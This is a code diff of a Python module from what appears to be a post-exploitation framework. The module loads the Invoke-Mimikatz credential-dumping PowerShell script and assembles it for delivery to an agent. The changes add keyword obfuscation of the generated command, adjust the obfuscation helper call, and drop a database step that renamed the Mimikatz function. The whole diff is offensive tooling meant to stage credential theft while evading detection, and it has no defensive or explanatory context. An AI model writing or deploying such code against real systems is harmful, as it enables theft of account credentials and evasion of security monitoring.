@@ -1,8 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
-import threading
+
 
 class Module(object):
 
@@ -53,9 +55,6 @@ class Module(object):
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
-        # used to protect self.http and self.mainMenu.conn during threaded listener access
-        self.lock = threading.Lock()
-
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -79,7 +78,7 @@ class Module(object):
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            helpers.obfuscate_module(self.mainMenu, moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
@@ -99,18 +98,8 @@ class Module(object):
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     scriptEnd += " -" + str(option) + " " + str(values['Value']) 
+        scriptEnd = helpers.keyword_obfuscation(scriptEnd)
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
-
-        # Get the random function name generated at install and patch the stager with the proper function name
-        conn = self.get_db_connection()
-        self.lock.acquire()
-        cur = conn.cursor()
-        cur.execute("SELECT Invoke_Mimikatz FROM functions")
-        replacement = cur.fetchone()
-        cur.close()
-        self.lock.release()
-        script = script.replace("Invoke-Mimikatz", replacement[0])
-
         return script
